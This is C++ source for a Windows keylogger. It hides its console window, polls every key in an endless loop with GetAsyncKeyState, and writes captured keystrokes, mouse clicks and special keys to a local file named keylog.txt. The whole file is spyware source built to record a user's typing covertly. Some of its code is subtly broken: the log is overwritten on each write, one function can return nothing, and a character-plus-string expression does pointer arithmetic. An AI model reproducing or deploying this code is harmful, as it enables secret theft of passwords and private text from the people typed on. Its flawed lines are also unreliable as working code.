#include<iostream>
#include<fstream>
#include<Windows.h>

using namespace std;

// Path of log
#define LOG_PATH "keylog.txt"

// Save data
void saveData(string data) {
	ofstream log(LOG_PATH);
	log << data;
	log.close();
}

// Translate special keys
string translateKey(int key) {
	switch (key)
	{
	case VK_LBUTTON:
		// Left mouse button
		return "[LMOUSE] ";
	case VK_RBUTTON:
		// Right mouse button
		return "[RMOUSE] ";
	case VK_CANCEL:
		// Cancel
		return "[CANCEL] ";
	case VK_MBUTTON:
		// Middle mouse button
		return "[MMOUSE] ";
	case VK_XBUTTON1:
		// X1 mouse button
		return "[X1MOUSE] ";
	case VK_XBUTTON2:
		// X2 mouse button
		return "[X2MOUSE] ";
	case VK_CLEAR:
		// Clear
		return "[CLEAR] ";
	case VK_PAUSE:
		// Pause
		return "[PAUSE] ";
	case VK_PRIOR:
		// Page up
		return "[PAGEUP] ";
	case VK_NEXT:
		// Page down
		return "[PAGEDOWN] ";
	case VK_END:
		// End
		return "[END] ";
	case VK_HOME:
		// Home
		return "[HOME] ";
	case VK_SELECT:
		// Select
		return "[SELECT] ";
	case VK_PRINT:
		// Print
		return "[PRINT] ";
	case VK_EXECUTE:
		// Execute
		return "[EXE] ";
	case VK_SNAPSHOT:
		// Print screen
		return "[PRINTSCREEN] ";
	case VK_INSERT:
		// Insert
		return "[INS] ";
	case VK_DELETE:
		// Delete
		return "[DEL] ";
	case VK_HELP:
		// Help
		return "[HELP] ";
	case VK_NUMPAD0:
		// Numpad 0
		return "[0] ";
	case VK_NUMPAD1:
		// Numpad 1
		return "[1] ";
	case VK_NUMPAD2:
		// Numpad 2
		return "[2] ";
	case VK_NUMPAD3:
		// Numpad 3
		return "[3] ";
	case VK_NUMPAD4:
		// Numpad 4
		return "[4] ";
	case VK_NUMPAD5:
		// Numpad 5
		return "[5] ";
	case VK_NUMPAD6:
		// Numpad 6
		return "[6] ";
	case VK_NUMPAD7:
		// Numpad 7
		return "[7] ";
	case VK_NUMPAD8:
		// Numpad 8
		return "[8] ";
	case VK_NUMPAD9:
		// Numpad 9
		return "[9] ";
	case VK_MULTIPLY:
		// Numpad multiply
		return "[Ã—] ";
	case VK_ADD:
		// Numpad add
		return "[+] ";
	case VK_SEPARATOR:
		// Numpad separator
		return "[SEPARATOR] ";
	case VK_DECIMAL:
		// Numpad decimal
		return "[.] ";
	case VK_SUBTRACT:
		// Numpad subtract
		return "[-] ";
	case VK_DIVIDE:
		// Numpad divide
		return "[/] ";
	case VK_SPACE:
		// Space
		return "[SPACE] ";
	case VK_CAPITAL:
		// Capslock
		return "[CAPSLOCK] ";
	case VK_ESCAPE:
		// Escape
		return "[ESC] ";
	case VK_TAB:
		// Tab
		return "[TAB] ";
	case VK_SHIFT:
		// Shift
		return "[SHIFT] ";
	case VK_CONTROL:
		// Control
		return "[CTRL] ";
	case VK_MENU:
		// Alt
		return "[ALT] ";
	case VK_BACK:
		// Backspace
		return "[BACKSPACE] ";
	case VK_RETURN:
		// Enter
		return "[ENTER]\n";
	case VK_UP:
		// Up arrow
		return "[UP] ";
	case VK_DOWN:
		// Down arrow
		return "[DOWN] ";
	case VK_LEFT:
		// Left arrow
		return "[LEFT] ";
	case VK_RIGHT:
		// Right arrow
		return "[RIGHT] ";
	// 24 function key
	case VK_F1:
		return "[F1] ";
	case VK_F2:
		return "[F2] ";
	case VK_F3:
		return "[F3] ";
	case VK_F4:
		return "[F4] ";
	case VK_F5:
		return "[F5] ";
	case VK_F6:
		return "[F6] ";
	case VK_F7:
		return "[F7] ";
	case VK_F8:
		return "[F8] ";
	case VK_F9:
		return "[F9] ";
	case VK_F10:
		return "[F10] ";
	case VK_F11:
		return "[F11] ";
	case VK_F12:
		return "[F12] ";
	case VK_F13:
		return "[F13] ";
	case VK_F14:
		return "[F14] ";
	case VK_F15:
		return "[F15] ";
	case VK_F16:
		return "[F16] ";
	case VK_F17:
		return "[F17] ";
	case VK_F18:
		return "[F18] ";
	case VK_F19:
		return "[F19] ";
	case VK_F20:
		return "[F20] ";
	case VK_F21:
		return "[F21] ";
	case VK_F22:
		return "[F22] ";
	case VK_F23:
		return "[F23] ";
	case VK_F24:
		return "[F24] ";
	case VK_NUMLOCK:
		// Numlock
		return "[NUMLOCK] ";
	case VK_SCROLL:
		// Scrollock
		return "[SCROLLOCK] ";
	default:
		break;
	}
}

// Main function
int main() {
	// Start of the program
	saveData("\n\n");
	// There are 13 VK_OEM... keycodes, that differ from keyboard to keayboard, implement them as you wish, either logging just the keystroke or
	// mapping them to characters
	int specialKeyArray[74] = { VK_LBUTTON, VK_RBUTTON, VK_CANCEL, VK_MBUTTON, VK_XBUTTON1, VK_XBUTTON2, VK_CLEAR, VK_PAUSE, VK_PRIOR, VK_NEXT,
								VK_END, VK_HOME, VK_SELECT, VK_PRINT, VK_EXECUTE, VK_SNAPSHOT, VK_INSERT, VK_DELETE, VK_HELP, VK_NUMPAD0,
								VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9,
								VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_DECIMAL, VK_SUBTRACT, VK_DIVIDE, VK_SPACE, VK_CAPITAL, VK_ESCAPE, VK_TAB,
								VK_SHIFT, VK_CONTROL, VK_MENU, VK_BACK, VK_RETURN, VK_UP, VK_DOWN, VK_RIGHT, VK_LEFT, VK_F1, VK_F2, VK_F3, VK_F4,
								VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12, VK_F13, VK_F14, VK_F15, VK_F16, VK_F17, VK_F18, VK_F19,
								VK_F20, VK_F21, VK_F22, VK_F23, VK_F24, VK_NUMLOCK, VK_SCROLL };
	// Hide window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	while (true) {
		for (int key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				bool isSpecial = find(begin(specialKeyArray), end(specialKeyArray), key) != end(specialKeyArray);
				if (isSpecial) {
					saveData(translateKey(key));
				}
				else {
					string data = (char)key + " ";
					saveData(data);
				}
			}
		}
	}
}
